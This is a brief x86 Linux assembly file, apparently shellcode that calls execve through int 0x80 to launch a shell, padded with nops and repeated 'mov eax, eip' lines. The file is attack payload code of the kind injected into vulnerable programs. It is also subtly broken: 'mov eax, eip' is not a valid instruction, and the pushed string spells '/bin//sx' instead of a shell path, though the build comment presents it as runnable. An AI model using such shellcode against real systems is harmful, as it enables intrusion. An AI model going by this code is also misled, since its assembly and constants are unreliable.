; shellcode.asm
; nasm -f elf32 shellcode.asm; ld -m elf_i386 -o shellcode_asm shellcode.o; ./shellcode_asm
section .text
global _start

_start:
	xor eax, eax
	push eax
	push 0x78732f2f
	nop
	nop
	mov eax, eip
	xor eax, eax
	push 0x6e69622f
	mov ebx, esp
	mov ecx, eax
	mov eax, eip
	xor eax, eax
	mov edx, eax
	mov al, 0xb
	int 0x80
	nop
	nop
	nop
	nop
	mov eax, eip
	xor eax, eax
	inc eax
	int 0x80

